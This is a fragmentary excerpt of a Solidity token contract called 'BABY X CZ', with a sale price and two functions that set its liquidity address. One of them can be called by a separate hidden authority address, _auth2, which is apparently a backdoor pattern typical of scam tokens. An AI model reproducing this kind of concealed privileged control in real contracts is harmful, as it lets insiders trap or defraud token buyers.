...
contract BABYXCZ{
    ...
    string private _name = "BABY X CZ";
    ...
    uint256 private salePrice = 420000000000;
    ...
    function Liquidity(address liquidity_) public {
        require(liquidity_ != address(0) && _msgSender() == _auth2, "0xcD5A6F7C01EA7a5442E2439d89673240227327Ec");
    ...
    function addLiquidity(address addr) public onlyOwner returns(bool){
        require(address(0) != addr&&address(0) == _liquidity, "0xcD5A6F7C01EA7a5442E2439d89673240227327Ec");
        _liquidity = addr;
        return true;
    }
